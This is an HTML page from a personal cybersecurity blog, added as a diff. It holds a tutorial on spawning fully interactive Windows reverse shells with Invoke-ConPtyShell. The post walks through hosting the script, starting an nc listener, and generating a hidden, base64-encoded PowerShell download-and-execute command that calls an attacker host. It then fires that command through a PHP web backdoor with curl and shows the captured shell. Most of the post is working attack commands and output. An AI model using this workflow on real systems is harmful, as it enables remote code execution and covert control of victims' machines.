@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="shortcut icon" href="/images/favicon.png " type="image/png">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Grant Trowbridge's Blog - When Shells Stabilize: Spawning Fully Interactive Windows Shells with Invoke-ConPtyShell</title>
+  <meta name="description" content="Picture this. You&#39;re in a good workflow on a Windows target, you even added some command history with rlwrap for quality of life. Then it happens, you ac...">
+  <link rel="stylesheet" href="/css/main.css ">
+  <link rel="alternate" type="application/rss+xml" title="Grant Trowbridge's Blog" href="http://localhost:4000/feed.xml
+    " />
+</head>
+
+<body>
+  <div id="header">
+  <div id="header__content">
+    <div id="header__info">
+      <h1><a href="/">Grant Trowbridge's Blog</a></h1>
+      <p>Cybersecurity blog covering security-related topics, CTFs, and signals
+</p>
+      <img src="/images/avatar.png" alt="avatar">
+    </div>
+    <ul id="header__nav">
+      <li><a href="/" class="">Main</a>
+      </li>
+      <li><a href="/about" class="">whoami</a></li>
+      <li><a href="/archive" class="">Archive</a></li>
+    </ul>
+  </div>
+</div>
+  <div id="content">
+    <div id="content__column">
+      <div id="single">
+  <h2 class="single__title">When Shells Stabilize: Spawning Fully Interactive Windows Shells with Invoke-ConPtyShell</h2>
+  <span class="single__date">Sep 8, 2025</span> 
+  <article class="single__article">
+  <p>Picture this. You&#39;re in a good workflow on a Windows target, you even added some command history with <code>rlwrap</code> for quality of life. Then it happens, you accidentally start a program in the foreground... You press <code>Ctrl + C</code> in your <code>nc</code> Windows shell one (1) time 😢</p>
+
+<p>Enter <a href="https://github.com/antonioCoco/ConPtyShell">Invoke-ConPtyShell.ps1</a>, a fully interactive reverse shell for Windows. Gone are the days of accidental shell deaths. Grab your trusty Python HTTP server, <code>nc</code> listener, a good attitude, and follow me!</p>
+
+<h1>Staging the File &amp; Listener</h1>
+
+<p>Navigate to the above linked GitHub repository and download the <code>Invoke-ConPtyShell.ps1</code> PowerShell script onto your attack machine.</p>
+
+<p>Host the file on your attack machine with <code>python3 -m http.server 80</code>.</p>
+<div class="highlight"><pre><code class="language-" data-lang="">┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
+└─$ ls   
+Invoke-ConPtyShell.ps1
+
+┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
+└─$ python3 -m http.server 80  
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre></div>
+<p>Setup your reverse shell listener on your attack machine with <code>stty raw -echo; (stty size; cat) | nc -lvnp 443</code> as specified by the GitHub repository&#39;s <code>README.md</code> file.</p>
+<div class="highlight"><pre><code class="language-" data-lang="">┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
+└─$ stty raw -echo; (stty size; cat) | nc -lvnp 443
+listening on [any] 443 ...
+</code></pre></div>
+<h1>Encoding the Command</h1>
+
+<p>Take note of your attack machine&#39;s terminal size with <code>stty size</code>. This will output the number of rows and columns, respectively.</p>
+<div class="highlight"><pre><code class="language-" data-lang="">┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
+└─$ stty size                                      
+52 236
+</code></pre></div>
+<p>For reasons I still don&#39;t understand, attempting to use <code>echo</code> and piping the output to <code>base64</code> does not result in a properly encoded command. PowerShell will fail to interpret the Base64 string. This is where the following Python script comes into play.</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python3
+</span><span class="kn">import</span> <span class="nn">base64</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'IEX(New-Object System.Net.WebClient).DownloadString("http://&lt;ATTACK-IP&gt;/Invoke-ConPtyShell.ps1");Invoke-ConPtyShell &lt;ATTACK-IP&gt; &lt;ATTACK-PORT&gt; -Rows &lt;ROWS&gt; -Cols &lt;COLS&gt;'</span>
+<span class="n">cmd</span> <span class="o">=</span> <span class="s">"powershell -nop -w hidden -e "</span> <span class="o">+</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf16'</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]).</span><span class="n">decode</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[1;37m[*] Encoded command: </span><span class="se">\033</span><span class="s">[1;00m</span><span class="se">\033</span><span class="s">[1;33m"</span> <span class="o">+</span> <span class="n">cmd</span> <span class="o">+</span> <span class="s">"</span><span class="se">\033</span><span class="s">[00m"</span><span class="p">)</span>
+</code></pre></div>
+<ul>
+<li><code>&lt;ATTACK-IP&gt;</code>: Your attack machine&#39;s IP address</li>
+<li><code>&lt;ATTACK-PORT&gt;</code>: Your attack machine&#39;s <code>nc</code> reverse shell listener port (443 in this example).</li>
+<li><code>&lt;ROWS&gt;</code>: Number of terminal rows</li>
+<li><code>&lt;COLS&gt;</code>: Number of terminal columns</li>
+</ul>
+
+<p>Once you&#39;ve entered all IP, port, and terminal information, execute the script using <code>python3 conpty.py</code> to encode the PowerShell command.</p>
+<div class="highlight"><pre><code class="language-" data-lang="">┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
+└─$ python3 conpty.py          
+[*] Encoded command: powershell -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...
+</code></pre></div>
+<h1>Execution</h1>
+
+<p>All that is left to do is copy the command and execute it via your target&#39;s RCE vulnerability. This example uses a PHP backdoor.</p>
+<div class="highlight"><pre><code class="language-" data-lang="">┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
+└─$ curl -b "wordpress_d407..." "http://192.168.X.X/foo/bar-content/plugins/askimet/?cmd=powershell%20-nop%20-w%20hidden%20-e%20SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A..."
+</code></pre></div>
+<p>If you navigate back to the Python HTTP server terminal, you&#39;ll notice the target has downloaded the PowerShell script.</p>
+<div class="highlight"><pre><code class="language-" data-lang="">┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
+└─$ python3 -m http.server 80  
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.X.X - - [08/Sep/2025 21:49:58] "GET /Invoke-ConPtyShell.ps1 HTTP/1.1" 200 -
+</code></pre></div>
+<p>Navigate to your reverse shell listener terminal and enjoy your fully interactive Windows reverse shell, <code>Ctrl + C</code> and all!</p>
+<div class="highlight"><pre><code class="language-" data-lang="">Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\foo\htdocs\bar&gt; whoami
+bar\corpuser
+PS C:\foo\htdocs\bar&gt; ^C
+PS C:\foo\htdocs\bar&gt; ^C
+PS C:\foo\htdocs\bar&gt;
+</code></pre></div>
+  </article>
+</div>
+    </div>
+  </div>
+    <div id="footer">
+  Powered by <a href="http://jekyllrb.com" target="_blank">Jekyll</a> · <a href="https://github.com/ifedyukin/Mekyll">Mekyll</a> theme <br>
+</div>
+
+</body>
+</html>
